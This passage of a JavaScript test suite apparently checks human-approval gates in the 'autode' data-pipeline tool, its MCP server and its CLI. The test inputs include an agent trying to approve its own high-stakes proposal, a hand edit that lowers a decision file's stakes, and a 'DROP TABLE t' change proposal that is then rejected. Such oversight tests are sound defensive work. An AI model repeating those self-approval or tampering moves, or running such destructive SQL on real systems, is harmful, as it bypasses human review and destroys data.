      nodeFs.writeFileSync(w.file('.autode', 'config', 'connections.yaml'), 'connections:\n  - platform: oracle\n    connectString: PRODDB\n    credentials: { resolver: vscode, ref: PRODDB }\n');
      const { Client } = require('@modelcontextprotocol/sdk/client/index.js');
      const { InMemoryTransport } = require('@modelcontextprotocol/sdk/inMemory.js');
      const { createAutodeServer } = fresh('../dist/mcp/server.js');
      const { PlatformSession } = fresh('../dist/mcp/platform.js');
      const session = new PlatformSession({ workspaceRoot: w.ws, allowWrite: false, allowCli: false, log: () => {}, env: {} });
      const server = createAutodeServer({ workspaceRoot: w.ws, resourcesRoot: nodePath.join(__dirname, '..'), version: 't', platform: session, log: () => {} });
      const [a, b] = InMemoryTransport.createLinkedPair();
      await server.connect(a);
      const client = new Client({ name: 't', version: '1' });
      await client.connect(b);
      try {
        const listed = (await client.callTool({ name: 'autode_list_connections', arguments: {} })).structuredContent;
        assert.deepStrictEqual(listed.connections.map((c) => [c.id, c.secretFromEnv]), [['oracle:PRODDB', ['AUTODE_ORACLE_PRODDB_PASSWORD']]]);
        const failed = (await client.callTool({ name: 'autode_test_connection', arguments: { connectionId: 'oracle:PRODDB' } })).structuredContent;
        assert.ok(/AUTODE_ORACLE_PRODDB_PASSWORD/.test(JSON.stringify(failed)), JSON.stringify(failed));
      } finally { await client.close(); }
    } finally { w.done(); }
  });

  await test('v0.39.0: the source and target cards keep their Snowflake/Databricks controls, add the Oracle source card and the onboarding hooks; no Oracle target card', () => {
    const html = require('node:fs').readFileSync(require('node:path').join(__dirname, '..', 'media', 'sidebar.html'), 'utf8');
    for (const id of ['testConnBtn', 'testConnBtnDbx', 'testTargetConnBtn', 'testTargetConnBtnDbx', 'sfPassword', 'dbxToken', 'tgtSfPassword', 'tgtDbxToken', 'testConnBtnOra', 'oraConnectString', 'oraPassword', 'savedConnsSource', 'savedConnsTarget']) assert.ok(html.includes(`id="${id}"`), id);
    assert.ok(html.includes('data-provider="oracle"') && !html.includes('data-target-provider="oracle"'));
    for (const msg of ['checkPrerequisites', 'findExistingConnections', 'saveNamedConnection', 'useConnection', 'recheckConnection', 'removeConnection']) assert.ok(html.includes(`'${msg}'`), msg);
  });

  // ── v0.40.0: PA1 — decision store and proposal tools ──

  await test('v0.40.0 (v0.45.8): a high-stakes proposal waits for a person — stakes are recomputed, never read from its file; a file resolution needs a name; mappings are no longer decisions or facts, and an old approved mapping decision still lands in the mapping document', async () => {
    const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const f = await mcpWorkspace();
    const client = await mcpSession(f.ws);
    const call = async (name, args) => (await client.callTool({ name, arguments: args })).structuredContent;
    const decisionsDir = nodePath.join(f.ws, '.autode', 'decisions');
    try {
      const ok = await call('autode_propose_connection', { connection: { platform: 'databricks', role: 'source', fields: { httpPath: '/sql/1.0/warehouses/w', catalog: 'main' }, credentials: { resolver: 'cli', ref: 'prod' } }, skill: 'onboarding' });
      const id = ok.decision.id;
      assert.deepStrictEqual([ok.decision.kind, ok.decision.stakes, ok.decision.status, ok.decision.proposedBy.client], ['connection', 'high', 'pending', 'autode-tests']);
      assert.deepStrictEqual(nodeFs.readdirSync(decisionsDir).sort(), [`${id}.proposal.json`, `${id}.yaml`], 'a proposal writes only its decision');
      assert.strictEqual((await call('autode_resolve_decision', { id, decision: 'approved', by: 'agent' })).code, 'PERMISSION_DENIED');
      const file = nodePath.join(decisionsDir, `${id}.yaml`);
      nodeFs.writeFileSync(file, nodeFs.readFileSync(file, 'utf8').replace('stakes: high', 'stakes: low').replace(/allowedChannels:\n(  - \w+\n)+/, 'allowedChannels:\n  - tool\n'));
      assert.strictEqual((await call('autode_resolve_decision', { id, decision: 'approved', by: 'agent' })).code, 'PERMISSION_DENIED', 'stakes are recomputed, never read from the file');
      nodeFs.writeFileSync(file, nodeFs.readFileSync(file, 'utf8').replace('decision: ""', 'decision: approved'));
      let listed = await call('autode_list_decisions', {});
      assert.deepStrictEqual(listed.incompleteFileResolutions, [id]);
      nodeFs.writeFileSync(file, nodeFs.readFileSync(file, 'utf8').replace('by: ""', 'by: priya'));
      listed = await call('autode_list_decisions', {});
      assert.ok(listed.appliedNow.some((m) => /Applied/.test(m)), JSON.stringify(listed));
      // Mappings: no proposal tool, no fact kind.
      assert.ok(!(await client.listTools()).tools.some((t) => t.name === 'autode_propose_mapping'));
      const fact = await call('autode_propose_assertion', { assertion: { kind: 'mapping', subject: ['shop.orders'], predicate: 'maps_to', value: { from: ['a'], to: 'b' }, statement: 'a maps to b', evidence: [{ type: 'file', ref: 'x' }] } });
      assert.ok(fact.code === 'VALIDATION_FAILED' && /mapping facts were retired/.test(JSON.stringify(fact)), JSON.stringify(fact));
      // A mapping decision approved before v0.45.8 still lands, as a draft in the mapping document.
      const { DecisionStore } = fresh('../dist/engine/decisions/decisionStore.js');
      const P = fresh('../dist/engine/decisions/proposals.js');
      const store = new DecisionStore(f.ws);
      const problemRoot = nodePath.join(f.ws, '.autode', 'problems', 'retail-ab12');
      const old = store.create({ kind: 'mapping', title: 'Map shop.orders → FACT_SALES', summary: '', proposal: { id: 'm1', sourceEntityId: 'shop.orders', sourceFqn: 'shop.orders', targetName: 'FACT_SALES', columns: [{ sourceColumn: 'amount', targetColumn: 'NET_AMOUNT' }] }, proposedBy: { host: 'mcp', client: 'test' }, validation: { ok: true, errors: [], warnings: [], checks: [] }, problemId: 'retail-ab12' });
      store.resolve(old.id, { decision: 'approved', by: 'priya', channel: 'cli' });
      const r = await P.applyDecision(store, old.id, { workspaceRoot: f.ws, problemRoot, problemId: 'retail-ab12' });
      assert.ok(r.applied, r.message);
      assert.ok(/NET_AMOUNT/.test(nodeFs.readFileSync(nodePath.join(problemRoot, 'context', 'mapping-context.yaml'), 'utf8')));
    } finally { await client.close(); f.done(); }
  });
  await test('v0.40.0: a decision whose document changed after it was proposed is superseded, not applied; an approved spec revision becomes the next draft', async () => {
    const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const { DecisionStore } = fresh('../dist/engine/decisions/decisionStore.js');
    const P = fresh('../dist/engine/decisions/proposals.js');
    const f = await mcpWorkspace();
    try {
      const problemRoot = nodePath.join(f.ws, '.autode', 'problems', 'retail-ab12');
      const specFile = nodePath.join(problemRoot, 'spec', 'business-problem.yaml');
      nodeFs.writeFileSync(specFile, 'id: bps-1\nversion: 2\nstatus: approved\nproblemStatement: Retail analytics\nobjectives: [Daily sales]\nscope: { in: [orders], out: [] }\nproblemStatementApproved: true\n');
      const store = new DecisionStore(f.ws);
      const ctx = { workspaceRoot: f.ws, problemRoot, problemId: 'retail-ab12' };
      const revision = { id: 'bps-1', problemStatement: 'Retail analytics', objectives: ['Daily sales', 'Weekly margin'], successCriteria: [], scope: { in: ['orders'], out: [] }, constraints: [], assumptions: [] };
      assert.throws(() => P.propose(store, ctx, 'spec_revision', { ...revision, id: 'other' }, { proposedBy: { host: 'mcp' } }), /not the active specification/);
      const first = P.propose(store, ctx, 'spec_revision', revision, { proposedBy: { host: 'mcp', client: 'cursor' } });
      store.resolve(first.id, { decision: 'approved', by: 'priya', channel: 'panel' });
      const r1 = await P.applyDecision(store, first.id, ctx);
      assert.ok(r1.applied, r1.message);
      const spec = fresh('../dist/engine/documents/problemDocuments.js').parseBusinessProblemSpec(nodeFs.readFileSync(specFile, 'utf8'));
      assert.deepStrictEqual([spec.version, spec.status, spec.objectives, spec.problemStatementApproved], [3, 'draft', ['Daily sales', 'Weekly margin'], true]);
      assert.ok(nodeFs.existsSync(nodePath.join(problemRoot, 'spec', 'history', 'business-problem.v2.approved.yaml')), 'the approved version is archived');
      const second = P.propose(store, ctx, 'spec_revision', { ...revision, problemStatement: 'Retail and returns analytics' }, { proposedBy: { host: 'mcp' } });
      nodeFs.appendFileSync(specFile, 'domain: retail\n'); // edited meanwhile
      store.resolve(second.id, { decision: 'approved', by: 'priya', channel: 'cli' });
      const r2 = await P.applyDecision(store, second.id, ctx);
      assert.deepStrictEqual([r2.applied, r2.decision.status], [false, 'superseded']);
      assert.ok(/domain: retail/.test(nodeFs.readFileSync(specFile, 'utf8')) && !/returns/.test(nodeFs.readFileSync(specFile, 'utf8')), 'the newer edit survives');
      assert.throws(() => store.resolve(second.id, { decision: 'approved', by: 'x', channel: 'panel' }), /superseded, not pending/);
      // The panel's own approvals are recorded too.
      const rec = store.recordResolved({ kind: 'spec_approval', title: 'Approve v3', summary: '', proposal: { id: 'bps-1', version: 3 }, proposedBy: { host: 'vscode' }, by: 'priya', channel: 'panel' });
      assert.deepStrictEqual([rec.status, rec.events.map((e) => e.type)], ['applied', ['proposed', 'approved', 'applied']]);
    } finally { f.done(); }
  });

  await test('v0.41.0: facts from agents go through the ledger gate — proposed (seen by conflicts), confirmed by a person, or by the agent for low stakes only', async () => {
    const f = await mcpWorkspace();
    const client = await mcpSession(f.ws);
    const call = async (name, args) => (await client.callTool({ name, arguments: args })).structuredContent;
    try {
      const fact = { kind: 'business_term', subject: ['obj:shop/prod/shop.orders'], predicate: 'defined_as', value: { term: 'Order', definition: 'A customer purchase' }, statement: 'An order is a customer purchase.', evidence: [{ type: 'file', ref: 'docs/glossary.md#order' }] };
      const p = await call('autode_propose_assertion', { assertion: fact, skill: 'glossary' });
      assert.deepStrictEqual([p.stakes, p.assertion.status, p.assertion.trust], ['low', 'proposed', 'inferred'], JSON.stringify(p));
      assert.strictEqual((await call('autode_propose_assertion', { assertion: fact })).duplicate, true, 'the same fact twice adds nothing');
      const key = await call('autode_propose_assertion', { assertion: { ...fact, kind: 'key', predicate: 'primary', value: ['order_id'], statement: 'order_id is the key of orders.' } });
      assert.strictEqual(key.stakes, 'high');
      assert.strictEqual((await call('autode_review_assertion', { id: key.assertion.id, action: 'confirm', by: 'agent' })).code, 'PERMISSION_DENIED', 'a key changes joins: a person decides');
      const r = await call('autode_review_assertion', { id: p.assertion.id, action: 'confirm', by: 'priya' });
      assert.deepStrictEqual([r.assertion.status, r.assertion.trust], ['active', 'confirmed']);
      const nodeFs = require('node:fs'); const nodePath = require('node:path');
      const ledgerDir = nodePath.join(f.ws, '.autode', 'knowledge', 'ledger');
      const events = nodeFs.readdirSync(ledgerDir).filter((n) => n.endsWith('.jsonl')).flatMap((n) => nodeFs.readFileSync(nodePath.join(ledgerDir, n), 'utf8').split(/\r?\n/).filter(Boolean).map((l) => JSON.parse(l)));
      assert.strictEqual(events.find((e) => e.type === 'asserted' && e.assertion.statement === fact.statement).assertion.createdBy, 'mcp:autode-tests:skill:glossary');
      assert.strictEqual(events.find((e) => e.type === 'confirmed' && e.assertionId === p.assertion.id).actor, 'user:priya');
      assert.ok(!nodeFs.existsSync(nodePath.join(f.ws, '.autode', 'decisions')), 'no decision files for facts');
      const prompt = await client.getPrompt({ name: 'autode_extract_assertions', arguments: { message: 'orders are keyed by order_id' } });
      assert.ok(/orders are keyed by order_id/.test(prompt.messages[0].content.text) && /autode_propose_assertion/.test(prompt.messages[0].content.text));
    } finally { await client.close(); f.done(); }
  });

  // ── v0.41.0: C4b — facts from conversation, Context Inbox, tool-action memory ──

  async function c4bLedger() {
    const os = require('node:os'); const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const dir = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-c4b-'));
    const { AssertionLedger } = fresh('../dist/engine/context/ledger.js');
    const ledger = new AssertionLedger(dir);
    await ledger.load();
    return { ledger, done: () => nodeFs.rmSync(dir, { recursive: true, force: true }) };
  }

  await test('v0.41.0: extraction output is validated and resolved; a later value for the same key is linked as a correction and retires the old fact only when confirmed', async () => {
    const X = fresh('../dist/engine/context/chatExtraction.js');
    const { detectConflicts } = fresh('../dist/engine/context/conflicts.js');
    const env = await c4bLedger();
    try {
      const resolve = (r) => ({ 'crm.customers': 'obj:crm/prod/crm.customers' }[r.toLowerCase()]);
      const turn = (ref, text) => ({ ref, text, source: 'chat' });
      const t5 = X.parseChatExtraction({ facts: [
        { kind: 'key', subject: ['crm.customers'], predicate: 'primary', value: ['customer_id'], statement: 'The customer key is customer_id.' },
        { kind: 'key', subject: ['crm.customers'], predicate: 'primary', value: 'customer_id', statement: 'bad value' },
        { kind: 'schema_fact', subject: ['x'], predicate: 'p', value: {}, statement: 'not extractable from chat' },
        { kind: 'business_term', subject: ['Churn'], predicate: 'defined_as', value: { term: 'Churn', definition: 'No order in 90 days' }, statement: 'Churn means no order in 90 days.' }
      ] }, turn('chat:c#5', 'The customer key across both systems is customer_id.'), resolve);
      assert.deepStrictEqual(t5.proposed.map((a) => [a.subject[0], a.status, a.trust, a.flags || []]), [['obj:crm/prod/crm.customers', 'proposed', 'inferred', []], ['Churn', 'proposed', 'inferred', ['unresolved_subject']]]);
      assert.strictEqual(t5.dropped.length, 2);
      const first = await X.recordChatProposals(env.ledger, t5);
      assert.strictEqual(first.recorded.length, 2);
      const old = first.recorded[0];
      const t6 = X.parseChatExtraction({ facts: [{ kind: 'key', subject: ['crm.customers'], predicate: 'primary', value: ['cust_no'], statement: 'In the CRM the customer key is cust_no.' }] }, turn('chat:c#6', 'Correction — in the CRM the customer key is cust_no, not customer_id.'), resolve);
      const second = await X.recordChatProposals(env.ledger, t6);
      assert.deepStrictEqual(second.corrections.map((c) => c.supersedes), [old.id]);
      const corr = second.recorded[0];
      assert.strictEqual(env.ledger.get(old.id).status, 'proposed', 'nothing retired while the correction is only proposed');
      assert.deepStrictEqual(detectConflicts(env.ledger.assertions()).filter((c) => c.rule === 'value'), [], 'a pending correction is not a conflict');
      await env.ledger.confirm(corr.id, 'user:priya');
      assert.deepStrictEqual([env.ledger.get(corr.id).status, env.ledger.get(old.id).status, env.ledger.get(old.id).supersededBy], ['active', 'superseded', corr.id]);
      const again = await X.recordChatProposals(env.ledger, X.parseChatExtraction({ facts: [{ kind: 'key', subject: ['crm.customers'], predicate: 'primary', value: ['CUST_NO'], statement: 'same' }] }, turn('chat:c#7', 'x'), resolve));
      assert.deepStrictEqual([again.recorded.length], [0], 'equal fact (case-insensitive key columns) is a duplicate');
    } finally { env.done(); }
  });

  await test('v0.41.0: extraction never blocks or fails a chat turn — a failing, garbled or silent model is reported, not thrown', async () => {
    const X = fresh('../dist/engine/context/chatExtraction.js');
    const env = await c4bLedger();
    try {
      const turn = { ref: 'chat:c#1', text: 'orders are keyed by order_id', source: 'chat' };
      const resolve = () => undefined;
      const failing = await X.extractFromTurn({ turn, ledger: env.ledger, resolve, complete: async () => { throw new Error('LLM request failed: no consent'); } });
      assert.ok(/no consent/.test(failing.error) && failing.recorded.length === 0);
      const garbled = await X.extractFromTurn({ turn, ledger: env.ledger, resolve, complete: async () => 'not json at all' });
      assert.ok(!garbled.error && garbled.recorded.length === 0 && garbled.dropped.length === 1);
      const silent = await X.extractFromTurn({ turn, ledger: env.ledger, resolve, complete: () => new Promise(() => {}), timeoutMs: 30 });
      assert.ok(/no answer within/.test(silent.error));
      const brokenLedger = { assertions: () => { throw new Error('disk full'); } };
      assert.ok(/disk full/.test((await X.extractFromTurn({ turn, ledger: brokenLedger, resolve, complete: async () => ({ facts: [] }) })).error));
      const skipped = await X.extractFromTurn({ turn: { ...turn, text: '/plan go' }, ledger: env.ledger, resolve, complete: async () => { throw new Error('must not be called'); } });
      assert.ok(!skipped.error, 'slash commands are not extracted');
    } finally { env.done(); }
  });

  await test('v0.41.0: /define, /rule, /decide and /assume capture facts without the model', () => {
    const X = fresh('../dist/engine/context/chatExtraction.js');
    const d = X.parseCaptureCommand('/define Active customer = ordered in the last 90 days', 'chat:c#2');
    assert.deepStrictEqual([d.kind, d.subject[0], d.value, d.status, d.createdBy], ['business_term', 'term:active_customer', { term: 'Active customer', definition: 'ordered in the last 90 days' }, 'proposed', 'user:capture']);
    assert.deepStrictEqual([X.parseCaptureCommand('/rule PII must never reach the marts', 'r').kind, X.parseCaptureCommand('/rule PII must never reach the marts', 'r').value.level], ['business_rule', 'STRICT']);
    assert.strictEqual(X.parseCaptureCommand('/decide Use SCD2 for customers', 'r').kind, 'decision');
    assert.strictEqual(X.parseCaptureCommand('/assume Refunds arrive within 30 days', 'r').kind, 'assumption');
    assert.ok(/Usage/.test(X.parseCaptureCommand('/define nothing here', 'r').error));
    assert.strictEqual(X.parseCaptureCommand('/plan something', 'r'), undefined);
    const { validateAssertion } = fresh('../dist/engine/context/assertionSchemas.js');
    for (const c of ['/define A = b', '/rule x', '/decide y', '/assume z']) assert.deepStrictEqual(validateAssertion(X.parseCaptureCommand(c, 'r')), [], c);
  });

  await test('v0.41.0: chat answers cite the facts they rest on — chat packs list fact ids; citations are read back; action entries fold into history', async () => {
    const X = fresh('../dist/engine/context/chatExtraction.js');
    const { buildContextPack } = fresh('../dist/engine/context/contextPack.js');
    const env = await c3.ledgerFor(c3.graph());
    try {
      const T = (n) => c3.graph().nodes.find((x) => x.fqn === n || x.label === n)?.id ?? n;
      const key = await env.ledger.assert({ kind: 'key', subject: [T('shop.orders')], predicate: 'primary', value: ['order_id'], statement: 'order_id is the key of shop.orders', evidence: [{ type: 'chat_message', ref: 'chat#t3' }], status: 'active', trust: 'confirmed' });
      const chat = buildContextPack({ purpose: 'chat', query: 'what is the key of shop.orders' }, c3.sources(env.ledger, env.project()));
      assert.ok(chat.text.includes('### Facts (cite as [fact:<id>])') && chat.text.includes(`[${key.id}] order_id is the key of shop.orders`), chat.text);
      const step = buildContextPack({ purpose: 'step', query: 'what is the key of shop.orders' }, c3.sources(env.ledger, env.project()));
      assert.ok(!step.text.includes('cite as'), 'only chat packs carry the citation list');
    } finally { env.cleanup(); }
    assert.deepStrictEqual(X.citedFactIds('Yes [fact:01ARZ3NDEKTSV4RRFFQ69G5FAV] and again [fact:01ARZ3NDEKTSV4RRFFQ69G5FAV], [fact:bogus].'), ['01ARZ3NDEKTSV4RRFFQ69G5FAV']);
    assert.ok(/\[fact:<id>\]/.test(X.CITATION_INSTRUCTION));
    const mock = createMock();
    const { foldActionEntries } = withMock(mock, () => fresh('../dist/core/agentHub.js'));
    assert.deepStrictEqual(foldActionEntries([{ role: 'user', content: 'write it', at: 't' }, { role: 'ai', content: 'Done.', at: 't' }, { role: 'log', content: 'wrote spec.md', at: 't' }, { role: 'user', content: 'next', at: 't' }]).map((m) => [m.role, m.content]),
      [['user', 'write it'], ['ai', 'Done.\n\n[Actions taken] wrote spec.md'], ['user', 'next']]);
    const { describeActions } = withMock(mock, () => fresh('../dist/core/webviewProvider.js'));
    assert.deepStrictEqual(describeActions([{ tool: 'autode_write_file', input: { path: 'a.sql' }, outcome: 'approved' }, { tool: 'autode_read_file', input: { path: 'b' }, outcome: 'ok' }, { tool: 'autode_run_command', input: { command: 'dbt run' }, outcome: 'denied' }]), ['wrote a.sql']);
  });

  await test('v0.41.0: the panel has the Context Inbox (facts, conflicts, paused steps, changes) and citation chips', () => {
    const html = require('node:fs').readFileSync(require('node:path').join(__dirname, '..', 'media', 'sidebar.html'), 'utf8');
    for (const t of ["case 'inboxState'", "post('reviewFact'", "post('verifyFact'", "post('bulkConfirmFacts'", 'Context Inbox', 'fact-chip', "case '/define'"]) assert.ok(html.includes(t), t);
  });

  await test('v0.40.0: the managers and the engine share one serialisation — a document written by either reads back the same', () => {
    const D = fresh('../dist/engine/documents/problemDocuments.js');
    const spec = { id: 'bps-9', version: 1, status: 'draft', problemStatement: 'P', objectives: ['o'], successCriteria: [], scope: { in: ['a'], out: [] }, constraints: [], assumptions: [], createdAt: 't', updatedAt: 't', dataFlows: [{ id: 'f', source: 's', target: 't', description: 'd' }] };
    const once = D.serializeBusinessProblemSpec(D.parseBusinessProblemSpec(D.serializeBusinessProblemSpec(spec)));
    assert.strictEqual(D.serializeBusinessProblemSpec(D.parseBusinessProblemSpec(once)), once, 'serialise → parse is stable');
    assert.deepStrictEqual(D.parseBusinessProblemSpec(once).dataFlows[0].source, 's');
    const mc = D.withMappingUpserted({ specId: 's', specVersion: 1, version: 2, status: 'approved', mappings: [] }, { id: 'm', sourceEntityId: 'x', sourceFqn: 'x', targetName: 'y', columns: [{ sourceColumn: 'a', targetColumn: 'b' }] }, new Date(0));
    assert.strictEqual(mc.status, 'built', 'an edited approved mapping set needs review again');
    const rev = D.nextMappingContextRevision({ specId: 's', specVersion: 1, version: 2, status: 'approved', mappings: [] }, mc);
    assert.deepStrictEqual([rev.toSave.version, rev.archivePrevious], [3, true]);
    assert.deepStrictEqual(D.parseMappingContext(D.serializeMappingContext(rev.toSave)).mappings[0].columns, [{ sourceColumn: 'a', targetColumn: 'b', transformExpression: undefined }]);
  });

  await test('v0.40.0: the panel offers decisions for review (Decisions section, approve and reject)', () => {
    const html = require('node:fs').readFileSync(require('node:path').join(__dirname, '..', 'media', 'sidebar.html'), 'utf8');
    assert.ok(html.includes('id="paletteDecisions"') && html.includes("post('resolveDecision'") && html.includes("case 'decisionsList'"));
  });

  // ── v0.42.0: PA2 — the autode package and CLI ──

  // The CLI in-process, with a scripted terminal.
  const cli = async (argv, { interactive = false, env = {}, answers = [], platform, runner } = {}) => {
    const { run } = fresh('../dist/cli/main.js');
    const out = []; const err = []; const asked = [];
    const io = { out: (t) => out.push(t), err: (t) => err.push(t), env, cwd: process.cwd(), interactive, prompt: async (q) => { asked.push(q); return answers.shift() ?? ''; }, platform, run: runner };
    const code = await run(argv, io);
    return { code, out: out.join('\n'), err: err.join('\n'), asked, json: () => JSON.parse(out.join('\n')) };
  };
  const pendingDecision = (ws, kind, proposal, problemId = 'retail-ab12') => {
    const { DecisionStore } = fresh('../dist/engine/decisions/decisionStore.js');
    return new DecisionStore(ws).create({ kind, title: `${kind} proposal`, summary: 's', proposal, proposedBy: { host: 'mcp', client: 'test' }, validation: { ok: true, errors: [], warnings: [], checks: [] }, problemId });
  };
  const goodMapping = { id: 'm1', sourceEntityId: 'shop.orders', sourceFqn: 'shop.orders', targetName: 'FACT_SALES', columns: [{ sourceColumn: 'amount', targetColumn: 'NET_AMOUNT' }] };

  await test('v0.42.0: autode check — 0 when clean, 1 on a validation failure, 3 on a pending high-stakes decision; a file resolution passes, an edited stakes: low does not', async () => {
    const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const f = await mcpWorkspace();
    try {
      const W = ['--workspace', f.ws];
      let r = await cli(['check', ...W]);
      assert.strictEqual(r.code, 0, r.out + r.err);
      assert.ok(/✓ retail-ab12: spec\/pipeline\.yaml/.test(r.out) && /check passed/.test(r.out), r.out);
      // A low-stakes fact waiting for review doesn't block; a mapping (high stakes) does.
      pendingDecision(f.ws, 'assertion', { kind: 'business_term', subject: ['x'], predicate: 'defined_as', value: {}, statement: 's', evidence: [] });
      assert.strictEqual((await cli(['check', ...W])).code, 0);
      const d = pendingDecision(f.ws, 'mapping', goodMapping);
      r = await cli(['check', ...W, '--json']);
      assert.strictEqual(r.code, 3);
      assert.deepStrictEqual([r.json().exitCode, r.json().pendingDecisions.map((x) => x.id)], [3, [d.id]]);
      // Someone edits the file's stakes: recomputed, still blocking.
      const file = nodePath.join(f.ws, '.autode', 'decisions', `${d.id}.yaml`);
      nodeFs.writeFileSync(file, nodeFs.readFileSync(file, 'utf8').replace('stakes: high', 'stakes: low'));
      assert.strictEqual((await cli(['check', ...W])).code, 3, 'stakes are recomputed');
      // A decision for another problem doesn't block this one.
      assert.strictEqual((await cli(['check', ...W, '--problem', 'retail-ab12'])).code, 3);
      nodeFs.mkdirSync(nodePath.join(f.ws, '.autode', 'problems', 'other', 'spec'), { recursive: true });
      assert.strictEqual((await cli(['check', ...W, '--problem', 'other'])).code, 0);
      // A person resolved it in the committed file (decision + by): it passes, and check wrote nothing.
      nodeFs.writeFileSync(file, nodeFs.readFileSync(file, 'utf8').replace('decision: ""', 'decision: approved').replace('by: ""', 'by: priya'));
      const before = treeState(f.ws);
      assert.strictEqual((await cli(['check', ...W])).code, 0);
      assert.strictEqual(treeState(f.ws), before, 'check never resolves or applies');
      // A validation failure outranks a pending decision. CI has no active problem: every problem is checked.
      pendingDecision(f.ws, 'mapping', goodMapping);
      nodeFs.writeFileSync(nodePath.join(f.ws, '.autode', 'problems', 'other', 'spec', 'pipeline.yaml'), 'id: p\nentities: 5\n');
      nodeFs.rmSync(nodePath.join(f.ws, '.autode', 'local'), { recursive: true, force: true });
      r = await cli(['check', ...W, '--json']);
      assert.strictEqual(r.code, 1);
      assert.deepStrictEqual(r.json().problems, ['other', 'retail-ab12']);
      assert.ok(r.json().findings.some((x) => x.problem === 'other' && !x.ok), JSON.stringify(r.json().findings));
      assert.strictEqual((await cli(['check', ...W, '--problem', 'nope'])).code, 5);
      assert.strictEqual((await cli(['chekc', ...W])).code, 2);
      assert.strictEqual((await cli(['check', '--frobnicate'])).code, 2);
    } finally { f.done(); }
  });

  await test('v0.42.0: autode decisions approve refuses without a terminal and with CI set; in a terminal it needs the typed confirmation, then the engine applies it', async () => {
    const nodeFs = require('node:fs'); const nodePath = require('node:path'); const { spawnSync } = require('node:child_process');
    const f = await mcpWorkspace();
    try {
      const W = ['--workspace', f.ws];
      const d = pendingDecision(f.ws, 'mapping', goodMapping);
      const mappingFile = nodePath.join(f.ws, '.autode', 'problems', 'retail-ab12', 'context', 'mapping-context.yaml');
      // The real binary over pipes: no terminal.
      const env = { ...process.env }; delete env.CI;
      let p = spawnSync(process.execPath, [nodePath.join(__dirname, '..', 'dist', 'autode.js'), 'decisions', 'approve', d.id, ...W], { encoding: 'utf8', env });
      assert.strictEqual(p.status, 4, p.stderr);
      assert.ok(/interactive terminal/.test(p.stderr), p.stderr);
      p = spawnSync(process.execPath, [nodePath.join(__dirname, '..', 'dist', 'autode.js'), 'decisions', 'reject', d.id, ...W], { encoding: 'utf8', env: { ...env, CI: 'true' } });
      assert.strictEqual(p.status, 4);
      assert.ok(/CI is set/.test(p.stderr), p.stderr);
      // Even with a terminal, CI wins.
      assert.strictEqual((await cli(['decisions', 'approve', d.id, ...W], { interactive: true, env: { CI: '1' }, answers: ['approve'] })).code, 4);
      // Not confirmed: nothing changes.
      let r = await cli(['decisions', 'approve', d.id, ...W], { interactive: true, answers: ['y'] });
      assert.strictEqual(r.code, 4);
      assert.ok(/Type approve to confirm/.test(r.asked[0]) && /mapping proposal/.test(r.out), r.out);
      assert.strictEqual((await cli(['decisions', 'list', ...W, '--status', 'pending', '--json'])).json().decisions.length, 1);
      // Confirmed by a person: resolved on the cli channel and applied by the engine.
      r = await cli(['decisions', 'approve', d.id, ...W, '--by', 'priya', '--note', 'checked'], { interactive: true, answers: ['approve'] });
      assert.strictEqual(r.code, 0, r.out + r.err);
      assert.ok(/Applied/.test(r.out), r.out);
      const shown = (await cli(['decisions', 'show', d.id, ...W, '--json'])).json();
      assert.strictEqual(shown.decision.status, 'applied');
      assert.ok(shown.decision.events.some((e) => e.type === 'approved' && e.channel === 'cli' && e.actor === 'priya'));
      assert.ok(/NET_AMOUNT/.test(nodeFs.readFileSync(mappingFile, 'utf8')));
      assert.strictEqual((await cli(['decisions', 'approve', d.id, ...W], { interactive: true, answers: ['approve'] })).code, 1, 'no longer pending');
      assert.strictEqual((await cli(['decisions', 'show', 'dec-01ARZ3NDEKTSV4RRFFQ69G5FAV', ...W])).code, 5);
      // Reject works the same way.
      const d2 = pendingDecision(f.ws, 'platform_change', { connectionId: 'snowflake:x', sql: 'DROP TABLE t', reason: 'r' });
      r = await cli(['decisions', 'reject', d2.id, ...W], { interactive: true, answers: ['reject'] });
      assert.strictEqual(r.code, 0);
      assert.strictEqual((await cli(['decisions', 'show', d2.id, ...W, '--json'])).json().decision.status, 'rejected');
    } finally { f.done(); }
  });

  await test('v0.42.0: validate, compile and grounding give the MCP tools\' answers; compile --out writes files; usage errors exit 2', async () => {
    const nodeFs = require('node:fs'); const nodePath = require('node:path'); const os = require('node:os');
    const f = await mcpWorkspace();
    const client = await mcpSession(f.ws);
    const out = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-cli-out-'));
    try {
      const W = ['--workspace', f.ws];
      const viaMcp = (await client.callTool({ name: 'autode_compile_pipeline_spec', arguments: { dialect: 'snowflake' } })).structuredContent;
      const viaCli = (await cli(['compile', '--dialect', 'snowflake', ...W, '--json'])).json();
      assert.deepStrictEqual(viaCli.entities, viaMcp.entities, 'same handler, same answer');
      assert.ok(viaMcp.entities.length > 0);
      assert.strictEqual((await cli(['compile', ...W])).code, 2, '--dialect is required');
      assert.strictEqual((await cli(['compile', '--dialect', 'cobol', ...W])).code, 2);
      const written = await cli(['compile', '--dialect', 'postgres', ...W, '--out', out, '--json']);
      assert.strictEqual(written.code, 0, written.err);
      assert.ok(written.json().written.length > 0 && written.json().written.every((x) => nodeFs.existsSync(x) && x.startsWith(out)));
      assert.ok(!nodeFs.existsSync(nodePath.join(f.ws, 'autode-output', 'retail-ab12')), 'nothing written into the workspace (its shared semantic model is part of the fixture)');
      // grounding: known tables pass, unknown ones fail.
      nodeFs.writeFileSync(nodePath.join(out, 'good.sql'), 'SELECT o.order_id, c.email FROM shop.orders o JOIN shop.customers c ON o.customer_id = c.customer_id');
      nodeFs.writeFileSync(nodePath.join(out, 'bad.sql'), 'SELECT x FROM shop.refunds');
      const good = await cli(['grounding', nodePath.join(out, 'good.sql'), ...W]);
      assert.strictEqual(good.code, 0, good.out);
      const bad = await cli(['grounding', nodePath.join(out, 'bad.sql'), ...W, '--json']);
      assert.strictEqual(bad.code, 1);
      const mcpBad = (await client.callTool({ name: 'autode_check_grounding', arguments: { content: 'SELECT x FROM shop.refunds', name: nodePath.join(out, 'bad.sql') } })).structuredContent;
      assert.deepStrictEqual(bad.json().results[0].unresolved, mcpBad.unresolved);
      assert.strictEqual((await cli(['grounding', ...W])).code, 2);
      assert.strictEqual((await cli(['grounding', nodePath.join(out, 'missing.sql'), ...W])).code, 5);
      // validate with a path, and an invalid spec.
